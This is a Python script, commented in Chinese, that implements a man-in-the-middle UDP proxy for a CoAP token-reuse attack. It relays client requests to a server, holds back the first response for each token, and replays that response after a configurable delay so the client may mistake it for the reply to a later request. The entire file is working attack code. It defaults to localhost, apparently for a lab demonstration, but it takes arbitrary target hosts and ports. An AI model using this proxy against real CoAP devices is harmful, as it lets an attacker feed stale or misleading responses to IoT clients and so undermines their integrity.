#!/usr/bin/env python3
"""
CoAP Token 重用攻击 - 中间人代理
实现应用层 MITM，拦截并控制客户端和服务器之间的所有 CoAP 通信

架构:
  Client (127.0.0.1:random) → Attacker (127.0.0.1:5684) → Server (127.0.0.1:5683)
  Client ← Attacker ← Server
"""
import asyncio
import logging
import socket
from datetime import datetime
from collections import defaultdict
import struct

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("MITM-Attacker")


class CoAPMessage:
    """简单的 CoAP 消息解析器"""
    
    @staticmethod
    def parse(data):
        """解析 CoAP 消息，提取关键信息"""
        if len(data) < 4:
            return None
        
        # CoAP 头部格式: Ver(2bit) | Type(2bit) | TKL(4bit) | Code(8bit) | Message ID(16bit)
        byte0 = data[0]
        version = (byte0 >> 6) & 0x03
        msg_type = (byte0 >> 4) & 0x03
        token_length = byte0 & 0x0F
        
        code = data[1]
        msg_id = struct.unpack('!H', data[2:4])[0]
        
        # 提取 Token
        token = data[4:4+token_length] if token_length > 0 else b''
        
        # 判断是请求还是响应
        is_request = (code >= 1 and code <= 31)  # 0.01-0.31 是请求
        is_response = (code >= 64)  # 2.xx, 4.xx, 5.xx 是响应
        
        return {
            'version': version,
            'type': msg_type,
            'token_length': token_length,
            'code': code,
            'msg_id': msg_id,
            'token': token,
            'is_request': is_request,
            'is_response': is_response,
            'raw': data
        }
    
    @staticmethod
    def format_code(code):
        """格式化 CoAP 代码为可读格式"""
        class_code = (code >> 5) & 0x07
        detail = code & 0x1F
        return f"{class_code}.{detail:02d}"


class MITMAttacker:
    """中间人攻击者 - UDP 代理"""
    
    def __init__(self, 
                 listen_host="127.0.0.1",
                 listen_port=5684,
                 server_host="127.0.0.1", 
                 server_port=5683,
                 attack_delay=5):
        """
        初始化 MITM 攻击者
        
        Args:
            listen_host: 监听地址（客户端连接这里）
            listen_port: 监听端口（客户端连接这里）
            server_host: 真实服务器地址
            server_port: 真实服务器端口
            attack_delay: 攻击延迟时间（秒）
        """
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.server_host = server_host
        self.server_port = server_port
        self.attack_delay = attack_delay
        
        # 存储客户端地址映射
        self.client_addresses = {}  # {token: (client_host, client_port)}
        
        # 存储捕获的响应
        self.captured_responses = {}  # {token: response_data}
        
        # 请求计数器
        self.request_counter = defaultdict(int)
        
        # UDP socket
        self.sock = None
        
        logger.info("="*70)
        logger.info("CoAP Token 重用攻击 - 中间人代理")
        logger.info("="*70)
        logger.info(f"监听地址: {listen_host}:{listen_port} (客户端连接这里)")
        logger.info(f"服务器地址: {server_host}:{server_port} (真实服务器)")
        logger.info(f"攻击延迟: {attack_delay} 秒")
        logger.info("="*70)
    
    async def handle_client_request(self, data, client_addr):
        """
        处理来自客户端的请求
        1. 解析请求
        2. 转发到服务器
        3. 记录 Token 和客户端地址的映射
        """
        msg = CoAPMessage.parse(data)
        if not msg:
            logger.warning(f"无法解析消息: {data.hex()}")
            return
        
        token_hex = msg['token'].hex() if msg['token'] else 'none'
        
        # 记录客户端地址
        self.client_addresses[token_hex] = client_addr
        
        # 请求计数
        self.request_counter[token_hex] += 1
        request_num = self.request_counter[token_hex]
        
        logger.info("="*70)
        logger.info(f"📤 [请求 #{request_num}] 客户端 → 攻击者")
        logger.info(f"   来源: {client_addr[0]}:{client_addr[1]}")
        logger.info(f"   Token: {token_hex}")
        logger.info(f"   消息ID: {msg['msg_id']}")
        logger.info(f"   代码: {CoAPMessage.format_code(msg['code'])}")
        logger.info(f"   原始数据: {data.hex()}")

        # 转发到服务器
        logger.info(f"📨 [转发] 攻击者 → 服务器 ({self.server_host}:{self.server_port})")
        logger.info(f"   转发数据: {data.hex()}")
        self.sock.sendto(data, (self.server_host, self.server_port))
        logger.info("="*70)

    async def handle_server_response(self, data, server_addr):
        """
        处理来自服务器的响应
        1. 解析响应
        2. 判断是否需要攻击（延迟/缓存）
        3. 转发或缓存响应
        """
        msg = CoAPMessage.parse(data)
        if not msg:
            logger.warning(f"无法解析消息: {data.hex()}")
            return

        token_hex = msg['token'].hex() if msg['token'] else 'none'

        # 查找对应的客户端地址
        client_addr = self.client_addresses.get(token_hex)
        if not client_addr:
            logger.warning(f"⚠️  未找到 Token {token_hex} 对应的客户端地址")
            return

        request_num = self.request_counter.get(token_hex, 0)

        logger.info("="*70)
        logger.info(f"📥 [响应 #{request_num}] 服务器 → 攻击者")
        logger.info(f"   Token: {token_hex}")
        logger.info(f"   消息ID: {msg['msg_id']}")
        logger.info(f"   代码: {CoAPMessage.format_code(msg['code'])}")
        logger.info(f"   原始数据: {data.hex()}")

        # 🎯 攻击逻辑：第一个请求的响应被缓存，不立即转发
        if request_num == 1:
            logger.warning(f"🎯 [攻击] 捕获第一个请求的响应，缓存不转发！")
            logger.warning(f"   将在 {self.attack_delay} 秒后重放此响应")
            self.captured_responses[token_hex] = (data, client_addr)

            # 调度延迟重放
            asyncio.create_task(self.delayed_replay(token_hex, data, client_addr))
        else:
            # 其他响应立即转发
            logger.info(f"📨 [转发] 攻击者 → 客户端 ({client_addr[0]}:{client_addr[1]})")
            self.sock.sendto(data, client_addr)

        logger.info("="*70)

    async def delayed_replay(self, token_hex, response_data, client_addr):
        """
        延迟重放响应

        Args:
            token_hex: Token（十六进制字符串）
            response_data: 响应数据
            client_addr: 客户端地址
        """
        await asyncio.sleep(self.attack_delay)

        logger.info("="*70)
        logger.warning(f"💣 [攻击] 重放旧响应！")
        logger.warning(f"   Token: {token_hex}")
        logger.warning(f"   目标: {client_addr[0]}:{client_addr[1]}")
        logger.warning(f"   这是第一个请求的响应，但客户端可能已经发送了新请求")
        logger.warning(f"   重放数据: {response_data.hex()}")

        # 重放响应
        self.sock.sendto(response_data, client_addr)

        logger.warning(f"   ✅ 旧响应已重放！客户端可能会将其误认为新请求的响应")
        logger.info("="*70)

    async def run(self):
        """运行 MITM 攻击者"""
        # 创建 UDP socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind((self.listen_host, self.listen_port))

        logger.info(f"✅ MITM 代理已启动")
        logger.info(f"   监听: {self.listen_host}:{self.listen_port}")
        logger.info(f"   等待客户端连接...")
        logger.info("")

        # 接收循环
        loop = asyncio.get_event_loop()

        while True:
            # 使用 run_in_executor 避免阻塞
            data, addr = await loop.run_in_executor(None, self.sock.recvfrom, 4096)

            logger.debug(f"收到数据包: 来自 {addr[0]}:{addr[1]}, 长度 {len(data)}")

            # 判断是来自客户端还是服务器
            if addr[1] == self.server_port:
                # 来自服务器的响应
                logger.debug(f"  → 判断为服务器响应（端口 {addr[1]} == {self.server_port}）")
                await self.handle_server_response(data, addr)
            else:
                # 来自客户端的请求
                logger.debug(f"  → 判断为客户端请求（端口 {addr[1]} != {self.server_port}）")
                await self.handle_client_request(data, addr)


async def main():
    """主函数"""
    import argparse

    parser = argparse.ArgumentParser(
        description="CoAP Token 重用攻击 - 中间人代理",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 使用默认配置
  python attacker.py

  # 自定义端口
  python attacker.py --listen-port 5684 --server-port 5683

  # 自定义攻击延迟
  python attacker.py --delay 10
        """
    )

    parser.add_argument("--listen-host", default="127.0.0.1",
                       help="监听地址 (默认: 127.0.0.1)")
    parser.add_argument("--listen-port", type=int, default=5684,
                       help="监听端口 (默认: 5684)")
    parser.add_argument("--server-host", default="127.0.0.1",
                       help="服务器地址 (默认: 127.0.0.1)")
    parser.add_argument("--server-port", type=int, default=5683,
                       help="服务器端口 (默认: 5683)")
    parser.add_argument("--delay", type=int, default=5,
                       help="攻击延迟时间（秒） (默认: 5)")

    args = parser.parse_args()

    attacker = MITMAttacker(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        server_host=args.server_host,
        server_port=args.server_port,
        attack_delay=args.delay
    )

    try:
        await attacker.run()
    except KeyboardInterrupt:
        logger.info("\n攻击者停止")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("\n程序被用户中断")

